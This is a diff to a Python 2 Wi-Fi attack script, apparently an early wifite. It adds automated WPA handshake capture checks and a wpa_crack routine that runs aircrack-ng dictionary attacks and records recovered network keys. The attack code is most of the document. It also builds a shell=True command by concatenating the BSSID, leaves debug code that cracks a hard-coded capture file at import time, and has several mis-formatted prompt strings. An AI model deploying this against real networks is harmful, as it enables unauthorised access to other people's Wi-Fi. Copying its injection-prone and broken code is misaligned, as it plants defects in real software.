@@ -5,6 +5,10 @@
 	
 	author: derv82 at gmail
 	
+	FIX:
+	 * Data entry (raw_input) after initial scan requires enter to be pressed TWICE
+	   This is unacceptable. I can't seem to fix it though :( stdin.flush does nothing!
+	
 	TODO:
 	 * WEP - ability to pause/skip/continue	 
 	 * reaver/walsh - integrate
@@ -58,12 +62,14 @@ HANDSHAKE_DIR        = 'hs' # Directory in which handshakes .cap files are store
 if HANDSHAKE_DIR[-1] == os.sep: HANDSHAKE_DIR = HANDSHAKE_DIR[:-1]
 WPA_FINDINGS         = [] # List of strings containing info on successful WPA attacks
 WPA_DONT_CRACK       = False # Flag to disable cracking of handshakes
-WPA_DICTIONARY       = '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
+WPA_DICTIONARY       = '/root/new/pw.txt' # '/pentest/web/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/phpbb.txt'
 if not os.path.exists(WPA_DICTIONARY): WPA_DICTIONARY = ''
-WPA_HANDSHAKE_TSHARK   = True # Various programs to check for a handshake using.
+WPA_HANDSHAKE_TSHARK   = True # Various programs to use to check for a handshake.
 WPA_HANDSHAKE_PYRIT    = True
-WPA_HANDSHAKE_COWPATTY = False
-WPA_HANDSHAKE_AIRCRACK = False
+WPA_HANDSHAKE_AIRCRACK = True
+WPA_HANDSHAKE_COWPATTY = True
+
+WPA_CRACKER = 'pyrit' # (Can be pyrit, aircrack-ng, or cowpatty)
 
 # WEP variables
 WEP_PPS             = 600 # packets per second (Tx rate)
@@ -293,9 +299,8 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 		if client_text != '': print '*%s*' % client_text
 		else: print ''
 	
-	print " [+] select "+G+"target numbers"+W+" ("+G+"1-%s) separated by commas, or '%s':" % (str(len(targets)) + W, G+'all'+W),
-	stdin.flush()
-	ri = raw_input()
+	ri = raw_input(" [+] select "+G+"target numbers"+W+" ("+G+"1-%s)" % (str(len(targets))+W) + \
+	                     "separated by commas, or '%s%s%s': %s" % (G, 'all', W, G))
 	if ri.strip().lower() == 'all':
 		victims = targets[:]
 	else:
@@ -418,11 +423,9 @@ def get_iface():
 		print " [+] interfaces in "+G+"monitor mode:"+W
 		for i, monitor in enumerate(monitors):
 			print "  %s. %s" % (G+str(i+1)+W, G+monitor+W)
-		print " [+] select "+G+"number"+W+" of interface to use for capturing ("+G+"1-%d%s):" % len(monitors, W),
-		ri = raw_input()
+		ri = raw_input(" [+] select "+G+"number"+W+" of interface to use for capturing ("+G+"1-%d%s): "+G % len(monitors), W)
 		while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
-			print " [+] select number of interface to use for capturing (1-%d):" % len(monitors),
-			ri = raw_input()
+			ri = raw_input(" [+] select number of interface to use for capturing (1-%d): "+G % len(monitors))
 		i = int(ri)
 		return monitors[i - 1]
 	
@@ -481,7 +484,6 @@ def has_handshake(target, capfile):
 	if WPA_HANDSHAKE_TSHARK and program_exists('tshark'):
 		# Call Tshark to return list of EAPOL packets in cap file.
 		tried = True
-		print "Checking with tshark",
 		cmd = ['tshark',
 		       '-r', capfile, # Input file
 		       '-R', 'eapol', # Filter (only EAPOL packets)
@@ -552,11 +554,11 @@ def has_handshake(target, capfile):
 	# Use CowPatty to check for handshake.
 	if valid_handshake and WPA_HANDSHAKE_COWPATTY and program_exists('cowpatty'):
 		tried = True
-		print "checking with cowpatty",
 		# Call cowpatty to check if capfile contains a valid handshake.
 		cmd = ['cowpatty',
 		       '-r', capfile,     # input file
 		       '-s', target.ssid, # SSID
+		       '-2',              # Uses frames 1, 2, or 3 for key attack (nonstrict)
 		       '-c']              # Check for handshake
 		proc = Popen(cmd, stdout=PIPE, stderr=DN)
 		proc.wait()
@@ -571,7 +573,6 @@ def has_handshake(target, capfile):
 	# Check for handshake using Pyrit if applicable
 	if valid_handshake and WPA_HANDSHAKE_PYRIT and program_exists('pyrit'):
 		tried = True
-		print "checking with pyrit",
 		# Call pyrit to "Analyze" the cap file's handshakes.
 		cmd = ['pyrit',
 		       '-r', capfile,
@@ -599,7 +600,6 @@ def has_handshake(target, capfile):
 	# Check for handshake using aircrack-ng
 	if valid_handshake and WPA_HANDSHAKE_AIRCRACK and program_exists('aircrack-ng'):
 		tried = True
-		print "Checking with aircrack",
 		crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
 		proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
 		proc_crack.wait()
@@ -782,7 +782,9 @@ def wpa_get_handshake(iface, target, clients):
 				os.rename(temp + 'wpa-01.cap.temp', save_as)
 				
 				print '\n %s %shandshake captured%s! saved as "%s"' % (sec_to_hms(seconds_running), G, W, G+save_as+W)
-				WPA_FINDINGS.append('%s (%s) handshake captured: %s' % (target.ssid, target.bssid, save_as))
+				WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
+				WPA_FINDINGS.append('stored at %s' % (save_as))
+				WPA_FINDINGS.append('')
 				
 				# Strip handshake if needed
 				if STRIP_HANDSHAKE: strip_handshake(save_as)
@@ -1226,15 +1228,16 @@ def main():
 			handshake_file = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid+'_'+target.bssid) + '.cap'
 			if os.path.exists(handshake_file):
 				print R+'\n [!] '+O+'you already have a handshake file for %s:' % (C+target.ssid+W)
-				print '        %s' % (G+handshake_file+W)
+				print '        %s\n' % (G+handshake_file+W)
 				print ' [+] do you want to '+G+'[s]kip'+W+', '+O+'[c]apture again'+W+', or '+R+'[o]verwrite'+W+'?'
-				print ' [+] enter '+G+'s'+W+', '+O+'c,'+W+' or '+R+'o'+W+':',
-				ri = raw_input()
+				ri = raw_input(' [+] enter '+G+'s'+W+', '+O+'c,'+W+' or '+R+'o'+W+': '+G)
+				print W+"\b",
 				while ri != 's' and ri != 'c' and ri != 'o': pass
 				if ri == 's': targets.remove(target)
-				elif ri == 'o': remove_file(save_as)
+				elif ri == 'o': remove_file(handshake_file)
 	except KeyboardInterrupt:
-		gracefully_exit(0)
+		print ''
+		exit_gracefully(0)
 	
 	wpa_success = 0
 	wep_success = 0
@@ -1273,7 +1276,7 @@ def main():
 		# If user wants to stop attacking
 		if TARGETS_REMAINING == 0: break
 	
-	# PRINT RESULTS
+	# Attacks are done! Show results to user
 	print ''
 	print ' [+] %s%d attack%s completed.%s' % (G, wpa_total + wep_total, '' if wpa_total+wep_total == 1 else 's', W)
 	print ''
@@ -1301,17 +1304,99 @@ def main():
 		print ' beginning WPA crack on %d handshake%s' % (caps, '' if caps == 1 else 's')
 		for cap in WPA_CAPS_TO_CRACK:
 			print ' cracking "%s" (%s)' % (cap.ssid, cap.filename)
-			wpa_crack(cap.filename, cap.ssid, cap.bssid)
+			wpa_crack(cap)
 	
 	exit_gracefully(0)
 
-def wpa_crack(capfile, ssid, bssid):
+def wpa_crack(capfile):
+	global WPA_CRACKER
 	# METHODS
-	#   Aircrack-ng
-	#   Pyrit + Cowpatty (pyrit isn't installed by default)
-	#   oclhashcat (not updated to handle PSK, needs aircrack's -J for .hccap conversion)
+	#   oclhashcat  (BT5R1 versions of oclhashcat and aircrack-ng are too outdated)
 	
-	pass
+	print ' [0:00:00] cracking %s with %s' % (G+capfile.ssid+W, G+WPA_CRACKER+W)
+	start_time = time.time()
+	cracked = False
+	#   Aircrack-ng (standard on BT5R1)
+	remove_file(temp + 'out.out')
+	remove_file(temp + 'wpakey.txt')
+	
+	if WPA_CRACKER.startswith('aircrack'):
+		cmd = ['aircrack-ng',
+		       '-a', '2',                 # WPA crack
+		       '-w', WPA_DICTIONARY,      # Wordlist
+		       '-l', temp + 'wpakey.txt', # Save key to file
+		       capfile.filename]
+		proc = Popen(cmd, stdout=open(temp + 'out.out', 'a'), stderr=DN)
+		try:
+			kt  = 0 # Keys tested
+			kps = 0 # Keys per second
+			while True: 
+				time.sleep(1)
+				
+				if proc.poll() != None: # aircrack stopped
+					if os.path.exists(temp + 'wpakey.txt'):
+						# Cracked
+						inf = open(temp + 'wpakey.txt')
+						key = inf.read().strip()
+						inf.close()
+						WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W))
+						print '\n [+] cracked %s (%s): "%s"\n' % (G+capfile.ssid+W, G+capfile.bssid+W, C+key+W)
+						cracked = True
+					else:
+						# Did not crack
+						print '\n [+] crack attempt '+R+'failed'+W+''
+					break
+				
+				inf = open(temp + 'out.out', 'r')
+				lines = inf.read().split('\n')
+				inf.close()
+				outf = open(temp + 'out.out', 'w')
+				outf.close()
+				for line in lines:
+					i = line.find(']')
+					j = line.find('keys tested', i)
+					if i != -1 and j != -1:
+						kts = line[i+2:j-1]
+						try: kt = int(kts)
+						except ValueError: pass
+					i = line.find('(')
+					j = line.find('k/s)', i)
+					if i != -1 and j != -1:
+						kpss = line[i+1:j-1]
+						try: kps = float(kpss)
+						except ValueError: pass
+				
+				print "\r %s keys tested: %d (%.2f keys/sec)   " % \
+				             (sec_to_hms(time.time() - start_time), kt, kps),
+				stdout.flush()
+				
+		except KeyboardInterrupt: print R+'\n ^C'+O+' cracking interrupted'+W
+		
+		send_interrupt(proc)
+		try: os.kill(proc.pid, SIGTERM)
+		except OSError: pass
+		
+		
+	#   Pyrit       (NOT standard on BT5R1)
+	elif WPA_CRACKER == 'pyrit':
+		cmd = ['pyrit',
+		       '-r', capfile.filename,
+		       '-b', capfile.bssid,
+		       '-i', 
+		       'attack_passthrough']
+		
+		
+	#   Cowpatty    (standard on BT5R1)
+	elif WPA_CRACKER == 'cowpatty':
+		pass
+	
+	# Default to aircrack
+	else:
+		print R+' [!]'+O+' unknown cracker: %s. defaulting to aircrack-ng'
+		WPA_CRACKER = 'aircrack'
+		return wpa_crack(capfile)
+		
+	return cracked
 
 def wps_attack(iface, target):
 	return False
@@ -1401,6 +1486,12 @@ def exit_gracefully(code):
 #t = Target('c0:c1:c0:07:54:dc', '1', '1', '6', 'WPA', 'Killfuck Soulshitter')
 #print has_handshake(t, 'wpa-01.cap')
 #exit_gracefully(1)
+
+c = CapFile('wpa-01.cap', 'Killfuck Soulshitter', 'c0:c1:c0:07:54:dc')
+WPA_CRACKER = 'aircrack'
+cracked = wpa_crack(c)
+print cracked
+exit_gracefully(1)
 
 
 if __name__ == '__main__':
